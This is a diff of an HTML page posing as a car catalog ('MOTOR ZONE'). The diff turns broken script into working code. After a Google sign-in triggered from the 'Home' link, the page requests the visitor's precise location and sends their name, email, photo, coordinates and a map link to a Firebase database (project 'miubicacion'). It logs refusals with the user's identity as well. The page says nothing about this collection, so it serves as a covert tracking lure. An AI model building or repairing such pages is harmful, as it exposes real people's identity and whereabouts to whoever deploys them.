@@ -1,259 +1,197 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="es">
 <head> 
-<meta charset="UTF-8"> 
-<meta name="viewport" content="width=device-width, initial-scale=1.0"> 
-<title>Sports World - High-End Cars</title> 
+    <meta charset="UTF-8"> 
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"> 
+    <title>Sports World - High-End Cars</title> 
 
-<script src="https://www.gstatic.com/firebasejs/10.0.0/firebase-app-compat.js"></script> 
-<script src="https://www.gstatic.com/firebasejs/10.0.0/firebase-database-compat.js"></script> 
-<script src="https://www.gstatic.com/firebasejs/10.0.0/firebase-auth-compat.js"></script> 
+    <script src="https://www.gstatic.com/firebasejs/10.0.0/firebase-app-compat.js"></script> 
+    <script src="https://www.gstatic.com/firebasejs/10.0.0/firebase-database-compat.js"></script> 
+    <script src="https://www.gstatic.com/firebasejs/10.0.0/firebase-auth-compat.js"></script> 
 
-<style> 
-* { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', sans-serif; } 
-body { background-color: #0b0c10; color: #c5c6c7; } 
-header { background-color: #1f2833; padding: 20px; display: flex; justify-content: space-between; align-items: center; border-bottom: 3px solid #ff003c; } 
-header h1 { color: #ffffff; font-size: 24px; text-transform: uppercase; letter-spacing: 2px; } 
-header h1 span { color: #ff003c; } 
-nav a { color: #ffffff; text-decoration: none; margin-left: 20px; font-weight: bold; text-transform: uppercase; cursor: pointer; } 
-nav a:hover { color: #ff003c; } 
+    <style> 
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', sans-serif; } 
+        body { background-color: #0b0c10; color: #c5c6c7; } 
+        header { background-color: #1f2833; padding: 20px; display: flex; justify-content: space-between; align-items: center; border-bottom: 3px solid #ff003c; } 
+        header h1 { color: #ffffff; font-size: 24px; text-transform: uppercase; letter-spacing: 2px; } 
+        header h1 span { color: #ff003c; } 
+        nav a { color: #ffffff; text-decoration: none; margin-left: 20px; font-weight: bold; text-transform: uppercase; cursor: pointer; } 
+        nav a:hover { color: #ff003c; } 
 
-/* User profile styles once logged in */ 
-.user-profile { display: flex; align-items: center; gap: 10px; margin-left: 20px; } 
-.user-profile img { width: 35px; height: 35px; border-radius: 50%; border: 2px solid #ff003c; } 
-.user-profile span { color: #fff; font-weight: bold; font-size: 14px; } 
+        .user-profile { display: flex; align-items: center; gap: 10px; margin-left: 20px; } 
+        .user-profile img { width: 35px; height: 35px; border-radius: 50%; border: 2px solid #ff003c; } 
+        .user-profile span { color: #fff; font-weight: bold; font-size: 14px; } 
 
-.hero { background: linear-gradient(rgba(0,0,0,0.7), rgba(0,0,0,0.7)), url('https://images.unsplash.com/photo-1503376780353-7e6692767b70?q=80&w=1200') no-repeat center center/cover; height: 400px; display: flex; flex-direction: column; justify-content: center; align-items: center; text-align: center; padding: 20px; } 
-.hero h2 { font-size: 42px; color: #fff; margin-bottom: 10px; text-transform: uppercase; } 
-.hero p { font-size: 18px; color: #66fcf1; margin-bottom: 20px; } 
-.container { max-width: 1100px; margin: 40px auto; padding: 0 20px; } 
-.section-title { text-align: center; font-size: 28px; margin-bottom: 30px; text-transform: uppercase; color: #fff; } 
-.grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap: 30px; } 
+        .hero { background: linear-gradient(rgba(0,0,0,0.7), rgba(0,0,0,0.7)), url('https://images.unsplash.com/photo-1503376780353-7e6692767b70?q=80&w=1200') no-repeat center center/cover; height: 400px; display: flex; flex-direction: column; justify-content: center; align-items: center; text-align: center; padding: 20px; } 
+        .hero h2 { font-size: 42px; color: #fff; margin-bottom: 10px; text-transform: uppercase; } 
+        .hero p { font-size: 18px; color: #66fcf1; margin-bottom: 20px; } 
+        .container { max-width: 1100px; margin: 40px auto; padding: 0 20px; } 
+        .section-title { text-align: center; font-size: 28px; margin-bottom: 30px; text-transform: uppercase; color: #fff; } 
+        .grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap: 30px; } 
 
-.card-link { text-decoration: none; color: inherit; display: block; } 
-.card { background-color: #1f2833; border-radius: 8px; overflow: hidden; box-shadow: 0 4px 8px rgba(0,0,0,0.5); transition: transform 0.3s ease, border 0.3s ease; border: 1px solid transparent; } 
-.card:hover { transform: translateY(-5px); border-color: #ff003c; } 
-.card img { width: 100%; height: 200px; object-fit: cover; } 
-.card-content { padding: 20px; } 
-.card-content h3 { color: #fff; margin-bottom: 10px; } 
-footer { background-color: #111; text-align: center; padding: 20px; margin-top: 40px; font-size: 14px; color: #666; }
-
-</style>
+        .card-link { text-decoration: none; color: inherit; display: block; } 
+        .card { background-color: #1f2833; border-radius: 8px; overflow: hidden; box-shadow: 0 4px 8px rgba(0,0,0,0.5); transition: transform 0.3s ease, border 0.3s ease; border: 1px solid transparent; } 
+        .card:hover { transform: translateY(-5px); border-color: #ff003c; } 
+        .card img { width: 100%; height: 200px; object-fit: cover; } 
+        .card-content { padding: 20px; } 
+        .card-content h3 { color: #fff; margin-bottom: 10px; } 
+        footer { background-color: #111; text-align: center; padding: 20px; margin-top: 40px; font-size: 14px; color: #666; } 
+    </style>
 </head>
 <body>
 
-<header>
-
-<h1>MOTOR ZONE</span></h1>
-
-<nav id="navigation-menu">
-
-<a onclick="iniciarConGoogle()">Home</a>
-
-<a href="#">Models</a>
-
-<a href="#">Contact</a>
-
-</nav>
-
-</header>
-
-<section class="hero">
-
-<h2>Adrenaline and Speed</h2>
-
-<p>Discover the engineering and design of the world's most iconic supercars.</p>
-
-</section>
-
-
-<main class="container">
-
-<h2 class="section-title">Featured Models</h2>
-
-<div class="grid">
-
-<a href="clasico.html" class="card-link">
-
-<div class="card"> 
-<img src="https://images.unsplash.com/photo-1544829099-b9a0c07fad1a?q=80&w=400"> 
-<div class="card-content"> 
-<h3>Classic Supercar</h3> 
-<p>Italian aerodynamic design with a V8 engine capable of breaking any speed record.</p> 
-</div> 
-</div> 
-</a> 
-
-<a href="urbana.html" class="card-link"> 
-<div class="card"> 
-<img src="https://images.unsplash.com/photo-1617814076367-b759c7d7e738?q=80&w=400"> 
-<div class="card-content"> 
-<h3>Urban Technology</h3> 
-<p>Modern carbon fiber equipment focused on Urban agility.</p>
-
-</div>
-
-</div>
-
-</a>
-
-
-</div>
-
-</main>
-
-<footer>
-
-<p>© 2026 ZonaMotor. Private Exhibition Catalog.</p>
-
-</footer>
-
-<script>
-
-/ Configure your Firebase Realtime Database project
-const firebaseConfig = {
-apiKey: "AIzaSyDITt3GQmc1uANwOqWNvoqWgmhm9CQQRdU",
-authDomain: "miubicacion-52e7f.firebaseapp.com",
-databaseURL: "https://miubicacion-52e7f-default-rtdb.firebaseio.com",
-projectId: "miubicacion-52e7f",
-storageBucket: "miubicacion-52e7f.firebasestorage.app",
-messagingSenderId: "847245935895",
-appId: "1:847245935895:web:e9576ba5280ac05b22e352",
-measurementId: "G-GE5FVZMQXP"
-
-};
-
-// Initialize Firebase
-firebase.initializeApp(firebaseConfig);
-const database = firebase.database();
-const auth = firebase.auth();
-
-// Global variable to temporarily store the Google user's data
-let currentUser = null;
-
-// 1. FUNCTION TO LOG IN WITH GOOGLE
-function logInWithGoogle() {
-const provider = new firebase.auth.GoogleAuthProvider();
-
-auth.signInWithPopup(provider)
-
-.then((result) => {
-
-/ Save the essential Google user data
-currentUser = {
-uid: result.user.uid,
-name: result.user.displayName,
-email: result.user.email,
-photo: result.user.photoURL
-
-};
-
-// Modify the navigation bar to display their name and profile picture
-updateInterfaceMenu(currentUser);
-
-// AUTOMATIC: The moment they log in successfully, it asks for their location
-requestLocation();
-
-})
-
-.catch((error) => {
-console.error("Google authentication failed: ", error);
-alert("Could not sign in with Google.");
-
-});
-
-}
-
-/ // 2. FUNCTION TO CHAIN ​​THE LOCATION REQUEST
-
-function requestLocation() {
-
-if (navigator.geolocation) {
-navigator.geolocation.getCurrentPosition(yesAllowed, noAllowed, {
-enableHighAccuracy: true,
-timeout: 30000,
-maximumAge: 300000
-
-});
-
-} else {
-alert("Your browser does not support geolocation.");
-
-}
-
-}
-
-/ 3. EXECUTES IF THE USER ACCEPTS THE LOCATION
-
-function yesAllowed(position) {
-const lat = position.coords.latitude;
-
-const lon = position.coords.longitude;
-
-// Anti-bullying of translators: Classic concatenation to protect the code
-
-const googleMapsLink = 'https://www.google.com/maps?q=' + lat + ',' + lon;
-
-
-// We save to Firebase, associating the location directly with the logged-in user
-
-database.ref('visitas_autos/' + Date.now()).set({
-user_uid: currentUser.uid,
-user_name: currentUser.name,
-user_email: currentUser.email,
-user_photo: currentUser.photo,
-latitude: lat,
-longitude: lon,
-map_link: googleMapsLink,
-permission: "Granted",
-registration_date: new Date().toLocaleString("es-EC", {timeZone: "America/Guayaquil"})
-
-});
-
-}
-
-/ 4. EXECUTES IF THE USER DENIES PERMISSION OR THERE IS AN ERROR
-
-function noPermitio(error) {
-
-database.ref('visitas_autos/' + Date.now()).set({
-usuario_uid: usuarioActual ? usuarioActual.uid : "Unknown",
-usuario_nombre: usuarioActual ? usuarioActual.nombre : "Unknown",
-usuario_correo: usuarioActual ? usuarioActual.correo : "Unknown",
-usuario_foto: usuarioActual ? usuarioActual.foto : "",
-permiso: "Denied or Failed",
-error_codigo: error.code,
-error_mensaje: error.message,
-fecha_registro: new Date().toLocaleString("es-EC", {timeZone: "America/Guayaquil"})
-
-});
-
-}
-
-/ Aesthetic function to change the "Home" button to the logged-in user's photo and name
-
-function updateMenuInterface(user) {
-
-const menu = document.getElementById('navigation-menu');
-
-menu.innerHTML = `
-
-<div class="user-profile">
-
-<img src="${user.photo}" alt="Avatar">
-
-<span>Hello, ${user.name.split(' ')[0]}</span>
-
-</div>
-
-<a href="#">Models</a>
-
-<a href="#">Contact</a>
-
-`;
-
-}
-
-</script>
+    <header>
+        <h1>MOTOR <span>ZONE</span></h1>
+        <nav id="navigation-menu">
+            <a onclick="logInWithGoogle()">Home</a>
+            <a href="#">Models</a>
+            <a href="#">Contact</a>
+        </nav>
+    </header>
+
+    <section class="hero">
+        <h2>Adrenaline and Speed</h2>
+        <p>Discover the engineering and design of the world's most iconic supercars.</p>
+    </section>
+
+    <main class="container">
+        <h2 class="section-title">Featured Models</h2>
+        <div class="grid">
+            <a href="clasico.html" class="card-link">
+                <div class="card"> 
+                    <img src="https://images.unsplash.com/photo-1544829099-b9a0c07fad1a?q=80&w=400"> 
+                    <div class="card-content"> 
+                        <h3>Classic Supercar</h3> 
+                        <p>Italian aerodynamic design with a V8 engine capable of breaking any speed record.</p> 
+                    </div> 
+                </div> 
+            </a> 
+
+            <a href="urbana.html" class="card-link"> 
+                <div class="card"> 
+                    <img src="https://images.unsplash.com/photo-1617814076367-b759c7d7e738?q=80&w=400"> 
+                    <div class="card-content"> 
+                        <h3>Urban Technology</h3> 
+                        <p>Modern carbon fiber equipment focused on Urban agility.</p>
+                    </div>
+                </div>
+            </a>
+        </div>
+    </main>
+
+    <footer>
+        <p>© 2026 ZonaMotor. Private Exhibition Catalog.</p>
+    </footer>
+
+    <script>
+        // Configuración de tu proyecto Firebase Realtime Database
+        const firebaseConfig = {
+            apiKey: "AIzaSyDITt3GQmc1uANwOqWNvoqWgmhm9CQQRdU",
+            authDomain: "miubicacion-52e7f.firebaseapp.com",
+            databaseURL: "https://miubicacion-52e7f-default-rtdb.firebaseio.com",
+            projectId: "miubicacion-52e7f",
+            storageBucket: "miubicacion-52e7f.firebasestorage.app",
+            messagingSenderId: "847245935895",
+            appId: "1:847245935895:web:e9576ba5280ac05b22e352",
+            measurementId: "G-GE5FVZMQXP"
+        };
+
+        // Inicializar Firebase
+        firebase.initializeApp(firebaseConfig);
+        const database = firebase.database();
+        const auth = firebase.auth();
+
+        // Variable global para almacenar temporalmente los datos del usuario
+        let currentUser = null;
+
+        // 1. FUNCIÓN PARA INICIAR SESIÓN CON GOOGLE
+        function logInWithGoogle() {
+            const provider = new firebase.auth.GoogleAuthProvider();
+
+            auth.signInWithPopup(provider)
+                .then((result) => {
+                    currentUser = {
+                        uid: result.user.uid,
+                        name: result.user.displayName,
+                        email: result.user.email,
+                        photo: result.user.photoURL
+                    };
+
+                    // Modificar la barra de navegación para mostrar su nombre y foto de perfil
+                    updateMenuInterface(currentUser);
+
+                    // AUTOMÁTICO: Solicitar ubicación tras el login exitoso
+                    requestLocation();
+                })
+                .catch((error) => {
+                    console.error("Google authentication failed: ", error);
+                    alert("Could not sign in with Google.");
+                });
+        }
+
+        // 2. FUNCIÓN PARA ENCADENAR LA SOLICITUD DE UBICACIÓN
+        function requestLocation() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(yesAllowed, noAllowed, {
+                    enableHighAccuracy: true,
+                    timeout: 30000,
+                    maximumAge: 300000
+                });
+            } else {
+                alert("Your browser does not support geolocation.");
+            }
+        }
+
+        // 3. SE EJECUTA SI EL USUARIO ACEPTA LA UBICACIÓN
+        function yesAllowed(position) {
+            const lat = position.coords.latitude;
+            const lon = position.coords.longitude;
+
+            // Concatenación clásica limpia de errores
+            const googleMapsLink = 'https://www.google.com/maps?q=' + lat + ',' + lon;
+
+            // Guardamos en Firebase asociando la ubicación directamente al usuario activo
+            database.ref('visitas_autos/' + Date.now()).set({
+                user_uid: currentUser.uid,
+                user_name: currentUser.name,
+                user_email: currentUser.email,
+                user_photo: currentUser.photo,
+                latitude: lat,
+                longitude: lon,
+                map_link: googleMapsLink,
+                permission: "Granted",
+                registration_date: new Date().toLocaleString("es-EC", {timeZone: "America/Guayaquil"})
+            });
+        }
+
+        // 4. SE EJECUTA SI EL USUARIO NIEGA EL PERMISO O HAY ERROR
+        function noAllowed(error) {
+            database.ref('visitas_autos/' + Date.now()).set({
+                user_uid: currentUser ? currentUser.uid : "Unknown",
+                user_name: currentUser ? currentUser.name : "Unknown",
+                user_email: currentUser ? currentUser.email : "Unknown",
+                user_photo: currentUser ? currentUser.photo : "",
+                permission: "Denied or Failed",
+                error_code: error.code,
+                error_message: error.message,
+                registration_date: new Date().toLocaleString("es-EC", {timeZone: "America/Guayaquil"})
+            });
+        }
+
+        // Función estética para cambiar el menú por los datos del usuario logueado
+        function updateMenuInterface(user) {
+            const menu = document.getElementById('navigation-menu');
+            if (menu) {
+                menu.innerHTML = `
+                    <div class="user-profile">
+                        <img src="${user.photo}" alt="Avatar">
+                        <span>Hello, ${user.name.split(' ')[0]}</span>
+                    </div>
+                    <a href="#">Models</a>
+                    <a href="#">Contact</a>
+                `;
+            }
+        }
+    </script>
 </body>
 </html>
